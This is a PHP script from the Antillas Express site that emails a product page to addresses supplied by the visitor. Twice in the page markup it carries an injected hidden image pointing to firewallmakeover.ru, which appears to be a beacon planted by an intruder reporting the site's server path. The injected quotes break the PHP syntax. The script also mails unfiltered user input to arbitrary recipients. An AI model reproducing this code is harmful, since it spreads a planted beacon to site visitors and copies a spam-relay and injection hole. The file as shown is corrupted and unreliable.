<?php
include('lib/config.php');
$param = &$__PARAMS;
$txt = textes($_SESSION['langue']);

    /*******************
     Les variables du E-Mail
     *******************/

$__LIEN_SITE    = "http://".$_SERVER['HTTP_HOST'].dirname($_SERVER['PHP_SELF']);
$cat = $_POST['id_cat'];
$infos_prod = get_prod_infos_by_id($_POST["id_prod"]);


$nom = "titre_".$_SESSION['langue'];
$desc1 = "description_".$_SESSION['langue'];
$desc2 = "description_supplementaire_".$_SESSION['langue'];

$sujet = sprintf( $txt['sujet_ami'], $__PARAMS['nom_client'], $_POST['envoi_prenom'], $_POST['envoi_nom'] );

// on joint le tout
$message = stripslashes($_POST['envoi_text'])."<br /><hr /><br />";

/****************************************************************/


ob_start();

echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
	</head>";
include('styles/style.inc');
echo 
"<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table width='$LargeAchat' width='$LargeAchat' cellpadding='4' cellspacing='4' align='$Enligne' border='0' >
	  	<tr>
	    	<td Valign='top' colspan='2' >
	    		$message
	      </td>
		</tr>
	  	<tr>
	    	<td Valign=top>
			 	<a href='$entr_path/produit_detail.php?cat=$cat&id=".$infos_prod['id']."' target='_blank'>
				<img src='$entr_path/photoget_web.php?No=".$infos_prod['id']."&Idx=".$infos_prod['medium']."' border='0' ></a>
			</td>
	      <td align='left'>
	      	<a href='$entr_path/produit_detail.php?cat=$cat&id=".$infos_prod['id']."' target=_blank>
	      	<span class=titre>".$infos_prod[$nom]."</span></a><br><br>
	        	<span class=description>".$infos_prod[$desc1]."<br><br>".$infos_prod[$desc2]."</span>
	      </td>
		</tr>
	  	<tr>
	    	<td Valign='top' colspan='2' >
				<a href='$entr_path/produit_detail.php?cat=$cat&id=".$infos_prod['id']."' target='_blank'>".
				$txt['visiter_produit']."</a><br>
	      </td>
		</tr>
	</table>
	<br>		
</body>
</html>";

$message = ob_get_contents();

ob_end_clean();

/****************************************************************/

$headers  = "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
$headers .= "From: Antillas Express <".$param['email_envoi'].">\r\n";
    /*******************
     L'envoie du E-Mail
     *******************/

foreach( $_POST['dest_courriel'] as $index => $email_addr){
	if( strlen( $email_addr ) ) {
		mail($email_addr, $sujet, $message, $headers);
//		echo "email ".$email_addr."<br>";
//		echo "sujet ".$sujet."<br>";
//		echo "header ".$headers."<br><br>";
//		echo $message;
	}

}

/*echo  "<br>http ".$_SERVER['HTTP_HOST']."<br>";
echo  "php ".$_SERVER['PHP_SELF']."<br>";
echo  "Dir ".dirname($_SERVER['PHP_SELF'])."<br>";
echo  "Dir ".$__LIEN_SITE."<br><br>";*/

echo 
"<html>
	<head>
		<title>Antillas-express - Montreal to Cuba - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='ACCUEIL'>
	</head>
<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
<table bgcolor='#dae5fb' width='$LargeAchat' cellpadding='4' cellspacing='1' align='$Enligne' border='1' >
  <tr>
		<td align='center' Valign=top >";

echo "<big>".$txt['envoyer_courriel']."<br><br><a href='produits_list.php?cat=$cat&id=".$infos_prod['id']."' target='ACCUEIL'>".
		$txt['continuer_a_magasiner'].'</a></big>'; 

echo "
		</td>
	</tr>	
</table>
</body>
</html>";

//   email($_POST['envoi_prenom']." ".$_POST['envoi_nom'],$_POST['envoi_courriel'],$email_addr,$sujet."_".$_SESSION['langue'],$message); // on envoie un e-mail

?>